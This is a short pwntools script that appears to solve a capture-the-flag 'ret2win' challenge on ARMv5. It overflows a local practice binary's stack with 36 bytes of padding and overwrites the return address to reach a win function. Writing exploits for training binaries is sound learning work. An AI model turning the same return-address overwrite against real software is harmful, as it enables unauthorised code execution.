from pwn import *

r=process('./ret2win_armv5')

r.recvuntil('> ')

payload='a'*36
payload+=p32(0x000105ec)

r.sendline(payload)

r.interactive()
